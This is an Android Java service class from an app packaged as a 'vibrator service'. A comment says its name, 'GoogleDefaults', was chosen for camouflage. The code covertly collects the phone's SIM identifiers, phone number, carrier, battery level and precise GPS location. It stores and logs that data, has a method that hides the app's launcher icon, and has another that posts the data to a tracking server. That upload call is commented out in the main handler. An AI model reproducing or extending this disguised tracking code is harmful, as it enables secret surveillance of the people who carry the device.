package com.awrtechnologies.androidvibratorservice.service;

import android.app.IntentService;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.support.v4.app.NotificationCompat;
import android.text.TextUtils;
import android.util.Log;

import com.awrtechnologies.androidvibratorservice.R;
import com.awrtechnologies.androidvibratorservice.activity.MainActivity;
import com.awrtechnologies.androidvibratorservice.api.callback.ApiCallBack;
import com.awrtechnologies.androidvibratorservice.api.caller.TrackCaller;
import com.awrtechnologies.androidvibratorservice.api.enums.ApiType;
import com.awrtechnologies.androidvibratorservice.api.params.TrackParam;
import com.awrtechnologies.androidvibratorservice.receiver.NetWorkStateReceiver;
import com.awrtechnologies.androidvibratorservice.utility.TelephonyInfo;
import com.google.android.gms.location.FusedLocationProviderApi;

import java.text.SimpleDateFormat;
import java.util.Date;


/**
 * Created by DALVEERSINGHDAIYA on 26-04-2017.
 * The name has been changed so that it stays in camouflage mode
 */
public class GoogleDefaults extends IntentService implements NetWorkStateReceiver.NetworkStateReceiverListener, ApiCallBack {

    String latlong = "";
    String tv_dual_sim = "";
    String tv_imei_main = "";
    String tv_imei_secondary = "";
    String tv_is_sim_one_ready = "";
    String tv_is_sim_two_ready = "";
    String tv_network_name = "";
    String tv_mobile_number = "";
    String tv_battery_percent = "";
    String tv_date_time = "";
    String tv_location = "";
    String tv_location_accuracy = "";
    String tv_location_bearing = "";
    String tv_location_altitude = "";
    String tv_latitude = "";
    String tv_longitude = "";

    NotificationManager notificationManager;

    //    For IMEI Data
    private static final int MY_PERMISSIONS_REQUEST_READ_PHONE_STATE = 0;

    //    For Battery Percentage
    int batteryLevel = 0;
    int batteryScale = 0;
    float batteryPercent = 0;

    private NetWorkStateReceiver networkStateReceiver;

    private String TAG = this.getClass ().getSimpleName ();

    public GoogleDefaults() {
        super ("Fused Location");
    }

    public GoogleDefaults(String name) {
        super (name);
    }

    @Override
    protected void onHandleIntent(Intent intent) {

        Log.i (TAG, "onHandleIntent");

        getUserData (false);

        notificationManager = (NotificationManager) this.getSystemService (Context.NOTIFICATION_SERVICE);

        if (!isLocationEnabled (this)) {
            enableLocation (this);
        } else if (!isNetworkAvailable ()) {
            showNoInternetDialog (this);
        } else {
            try {
                notificationManager.cancelAll ();
            } catch (Exception e) {
                e.printStackTrace ();
            }

            Location location = intent.getParcelableExtra (FusedLocationProviderApi.KEY_LOCATION_CHANGED);
            if (location != null) {

                tv_location = location.getLatitude () + "," + location.getLongitude ();
                tv_latitude = String.valueOf (location.getLatitude ());
                tv_longitude = String.valueOf (location.getLongitude ());

                tv_location_accuracy = location.getAccuracy () + "";
                tv_location_altitude = location.getAltitude () + "";
                tv_location_bearing = location.getBearing () + "";
                tv_battery_percent = getBatteryPercent () + "";
                tv_date_time = getCurrentSystemDateTime ();

                //   Sending to Activity
                Intent i = new Intent ("LOCATION_UPDATED");
                i.putExtra ("tv_dual_sim", tv_dual_sim);
                i.putExtra ("tv_imei_main", tv_imei_main);
                i.putExtra ("tv_imei_secondary", tv_imei_secondary);
                i.putExtra ("tv_is_sim_one_ready", tv_is_sim_one_ready);
                i.putExtra ("tv_is_sim_two_ready", tv_is_sim_two_ready);
                i.putExtra ("tv_network_name", tv_network_name);
                i.putExtra ("tv_mobile_number", tv_mobile_number);
                i.putExtra ("tv_battery_percent", tv_battery_percent);
                i.putExtra ("tv_date_time", tv_date_time);
                i.putExtra ("tv_location", tv_location);
                i.putExtra ("tv_location_accuracy", tv_location_accuracy);
                i.putExtra ("tv_location_bearing", tv_location_bearing);
                i.putExtra ("tv_location_altitude", tv_location_altitude);

                sendBroadcast (i);//That's how you do it, See B-|

                saveDataInSharedPreferences ();
                getDataFromSharedPreferences (false);
                try {
                    networkStateReceiver = new NetWorkStateReceiver ();
                    networkStateReceiver.addListener (this);
                    this.registerReceiver (networkStateReceiver, new IntentFilter (android.net.ConnectivityManager.CONNECTIVITY_ACTION));
                } catch (Exception e) {
                    e.printStackTrace ();
                }


//                sendDataToWeb ();


            }
        }
    }

    // FOR BATTERY AND TELEPHONY DATA
    public float getBatteryPercent() {
        IntentFilter ifilter = new IntentFilter (Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = this.registerReceiver (null, ifilter);

        // Are we charging / charged?
        int status = batteryStatus.getIntExtra (BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;

        // How are we charging?
        int chargePlug = batteryStatus.getIntExtra (BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;

        batteryLevel = batteryStatus.getIntExtra (BatteryManager.EXTRA_LEVEL, -1);
        batteryScale = batteryStatus.getIntExtra (BatteryManager.EXTRA_SCALE, -1);

        batteryPercent = batteryLevel / (float) batteryScale;
        return batteryPercent * 100;
    }

    //    For Current System DateTime
    public String getCurrentSystemDateTime() {
        SimpleDateFormat sdf = new SimpleDateFormat ("EEE, d MMM yyyy HH:mm:ss");
        String currentDateandTime = sdf.format (new Date ());
        return currentDateandTime;
    }

    //    For Telephonic Data
    public void getUserData(boolean showlogs) {

        TelephonyInfo telephonyInfo = TelephonyInfo.getInstance (this);

        tv_imei_main = telephonyInfo.getImsiSIM1 ();
        tv_imei_secondary = telephonyInfo.getImsiSIM2 ();

        boolean isSIM1Ready = telephonyInfo.isSIM1Ready ();
        boolean isSIM2Ready = telephonyInfo.isSIM2Ready ();

        tv_is_sim_one_ready = isSIM1Ready + "";
        tv_is_sim_two_ready = isSIM2Ready + " ";

        //        boolean isDualSIM = telephonyInfo.isDualSIM();
        //        tv_dual_sim = isDualSIM + "";

        if (tv_imei_main.equals (tv_imei_secondary)) {
            tv_dual_sim = "false";
        } else {
            tv_dual_sim = "true";
        }

        if (telephonyInfo.getcarrierName ().equals ("") || telephonyInfo.getcarrierName () == null) {
            tv_network_name = "Not Accessible";
        } else {
            tv_network_name = telephonyInfo.getcarrierName ();
        }

        Log.d ("Daiya", "Line number " + telephonyInfo.getPhoneNumberMain ());

        if (telephonyInfo.getPhoneNumberMain () == null || telephonyInfo.getPhoneNumberMain ().equals (null) || telephonyInfo.getPhoneNumberMain ().isEmpty ()) {
            tv_mobile_number = "Not Accessible";
        } else {
            tv_mobile_number = telephonyInfo.getPhoneNumberMain ();
        }
        if (showlogs) {
            Log.d ("Daiya", "User Data" + " IME1 : " + tv_imei_main + "\n" +
                    " IME2 : " + tv_imei_secondary + "\n" +
                    " IS DUAL SIM : " + tv_dual_sim + "\n" +
                    " IS SIM1 READY : " + isSIM1Ready + "\n" +
                    " IS SIM2 READY : " + isSIM2Ready + "\n" +
                    "Network Name : " + telephonyInfo.getcarrierName () + "\n"
                    + "Mobile Number : " + telephonyInfo.getPhoneNumberMain ());

            Log.d ("Daiya", "Battery percentage : " + getBatteryPercent ());
            Log.d ("Daiya", "Battery batteryScale : " + batteryScale);
            Log.d ("Daiya", "Battery batteryLevel : " + batteryLevel);
            Log.d ("Daiya", "getCurrentSystemDateTime : " + getCurrentSystemDateTime ());
        }
    }


    public void saveDataInSharedPreferences() {

        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences (this);
        SharedPreferences.Editor editor = preferences.edit ();
        editor.putString ("tv_location", tv_location);
        editor.putString ("tv_dual_sim", tv_dual_sim);
        editor.putString ("tv_imei_main", tv_imei_main);
        editor.putString ("tv_imei_secondary", tv_imei_secondary);
        editor.putString ("tv_is_sim_one_ready", tv_is_sim_one_ready);
        editor.putString ("tv_is_sim_two_ready", tv_is_sim_two_ready);
        editor.putString ("tv_network_name", tv_network_name);
        editor.putString ("tv_mobile_number", tv_mobile_number);
        editor.putString ("tv_battery_percent", tv_battery_percent);
        editor.putString ("tv_date_time", tv_date_time);
        editor.putString ("tv_location_accuracy", tv_location_accuracy);
        editor.putString ("tv_location_bearing", tv_location_bearing);
        editor.putString ("tv_location_altitude", tv_location_altitude);

        editor.apply ();
    }

    public void getDataFromSharedPreferences(boolean showlogs) {
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences (this);
        String name = preferences.getString ("Name", null);
        if (name != null) {
        }

        tv_location = preferences.getString ("tv_location", null);
        tv_dual_sim = preferences.getString ("tv_dual_sim", null);
        tv_imei_main = preferences.getString ("tv_imei_main", null);
        tv_imei_secondary = preferences.getString ("tv_imei_secondary", null);
        tv_is_sim_one_ready = preferences.getString ("tv_is_sim_one_ready", null);
        tv_is_sim_two_ready = preferences.getString ("tv_is_sim_two_ready", null);
        tv_network_name = preferences.getString ("tv_network_name", null);
        tv_mobile_number = preferences.getString ("tv_mobile_number", null);
        tv_battery_percent = preferences.getString ("tv_battery_percent", null);
        tv_date_time = preferences.getString ("tv_date_time", null);
        tv_location_accuracy = preferences.getString ("tv_location_accuracy", null);
        tv_location_bearing = preferences.getString ("tv_location_bearing", null);
        tv_location_altitude = preferences.getString ("tv_location_altitude", null);

        if (showlogs) {
            Log.d ("Daiya", tv_location);
            Log.d ("Daiya", tv_dual_sim);
            Log.d ("Daiya", tv_imei_main);
            Log.d ("Daiya", tv_imei_secondary);
            Log.d ("Daiya", tv_is_sim_one_ready);
            Log.d ("Daiya", tv_is_sim_two_ready);
            Log.d ("Daiya", tv_network_name);
            Log.d ("Daiya", tv_mobile_number);
            Log.d ("Daiya", tv_battery_percent);
            Log.d ("Daiya", tv_date_time);
            Log.d ("Daiya", tv_location_accuracy);
            Log.d ("Daiya", tv_location_bearing);
            Log.d ("Daiya", tv_location_altitude);
            Log.e ("Daiya", "Network : " + isNetworkAvailable ());
        }
    }

    @Override
    public void networkAvailable() {
//        Log.e("Network", "networkAvailable" + "networkAvailable");
    }

    @Override
    public void networkUnavailable() {
//        Log.e("Network", "networkUnavailable" + "networkUnavailable");
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) this.getSystemService (CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo ();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected ();
    }

    public static boolean isLocationEnabled(Context context) {
        int locationMode = 0;
        String locationProviders;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            try {
                locationMode = Settings.Secure.getInt (context.getContentResolver (), Settings.Secure.LOCATION_MODE);

            } catch (Settings.SettingNotFoundException e) {
                e.printStackTrace ();
                return false;
            }

            return locationMode != Settings.Secure.LOCATION_MODE_OFF;

        } else {
            locationProviders = Settings.Secure.getString (context.getContentResolver (), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
            return !TextUtils.isEmpty (locationProviders);
        }

    }

    public void enableLocation(final Context context) {
        LocationManager lm = (LocationManager) context.getSystemService (Context.LOCATION_SERVICE);
        boolean gps_enabled = false;

        try {
            gps_enabled = lm.isProviderEnabled (LocationManager.GPS_PROVIDER);
        } catch (Exception ex) {
        }

        if (!gps_enabled) {
            Intent gpsOptionsIntent = new Intent (Settings.ACTION_LOCATION_SOURCE_SETTINGS);
            // Send data to NotificationView Class

            // Open NotificationView.java Activity
            PendingIntent pIntent = PendingIntent.getActivity (this, 0, gpsOptionsIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT);

            //Create Notification using NotificationCompat.Builder
            NotificationCompat.Builder builder = new NotificationCompat.Builder (this)
                    // Set Icon
                    .setSmallIcon (R.drawable.ic_warning_white_24dp)
                    // Set Ticker Message
                    .setTicker ("Enable Location.")
                    // Set Title
                    .setContentTitle ("Enable Location.")
                    // Set Text
                    .setContentText ("Location not enabled. Please Enable Location settings with high Accuracy.")
                    // Add an Action Button below Notification
                    .addAction (R.drawable.ic_warning_white_24dp, "Open", pIntent)
                    // Set PendingIntent into Notification
                    .setContentIntent (pIntent)
                    // Dismiss Notification
                    .setAutoCancel (false);

            // Create Notification Manager
            NotificationManager notificationmanager = (NotificationManager) getSystemService (NOTIFICATION_SERVICE);
            // Build Notification with Notification Manager
            notificationmanager.notify (2, builder.build ());
        }
    }

    private void showNoInternetDialog(final Context context) {
        Intent gpsOptionsIntent = new Intent (android.provider.Settings.ACTION_WIRELESS_SETTINGS);
        // Send data to NotificationView Class
//        Intent intent = new Intent();
//        intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.Settings$DataUsageSummaryActivity"));

        // Open NotificationView.java Activity
        PendingIntent pIntent = PendingIntent.getActivity (context, 0, gpsOptionsIntent,
                PendingIntent.FLAG_UPDATE_CURRENT);

        //Create Notification using NotificationCompat.Builder
        NotificationCompat.Builder builder = new NotificationCompat.Builder (context)
                // Set Icon
                .setSmallIcon (R.drawable.ic_warning_white_24dp)
                // Set Ticker Message
                .setTicker ("Enable Internet.")
                // Set Title
                .setContentTitle ("Enable Internet.")
                // Set Text
                .setContentText ("No active Internet connection found. Please enable your Wifi or Mobile Data.")
                // Add an Action Button below Notification
                .addAction (R.drawable.ic_warning_white_24dp, "Open", pIntent)
                // Set PendingIntent into Notification
                .setContentIntent (pIntent)
                // Dismiss Notification
                .setAutoCancel (false);

        // Create Notification Manager
        NotificationManager notificationmanager = (NotificationManager) getSystemService (NOTIFICATION_SERVICE);
        // Build Notification with Notification Manager
        notificationmanager.notify (1, builder.build ());
    }

    public static void setHideApplication(Context c, boolean hide) {
        ComponentName cn = new ComponentName (c.getApplicationContext (),
                MainActivity.class);
        int setting = hide ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
        int current = c.getPackageManager ().getComponentEnabledSetting (cn);
        if (current != setting) {
            c.getPackageManager ().setComponentEnabledSetting (cn, setting,
                    PackageManager.DONT_KILL_APP);
        }
    }

    public void sendDataToWeb() {
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences (this);
        String accessToken = preferences.getString ("accessToken", null);
        Log.d ("Daiya", "Access Token on calling track : " + accessToken);

        TrackParam param = new TrackParam ();
        param.latitude = tv_latitude;
        param.longitude = tv_longitude;
        param.dual_sim = tv_dual_sim;
        param.imei_primary = tv_imei_main;
        param.imei_secondary = tv_imei_secondary;
        param.is_primary_sim_ready = tv_is_sim_one_ready;
        param.is_secondary_sim_ready = tv_is_sim_two_ready;
        param.network_name = tv_network_name;
        param.primary_mobile_num = tv_mobile_number;
        param.secondary_network_num = tv_network_name;
        param.battery_percent = tv_battery_percent;
        param.date_time = tv_date_time;
        param.location_accuracy = tv_location_accuracy;
        param.location_bearing = tv_location_bearing;
        param.location_altitude = tv_location_altitude;
        param.access_token = accessToken;

        TrackCaller.instance ().post (this, param, this, ApiType.TRACK);

    }


    @Override
    public void onResult(String result, ApiType apitype, int resultCode) {
        if (apitype == ApiType.TRACK) {
            if (resultCode == 200) {
                Log.d ("Daiya", "On result track on service : " + resultCode + " result : " + result);
            }
        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy ();
    }
}
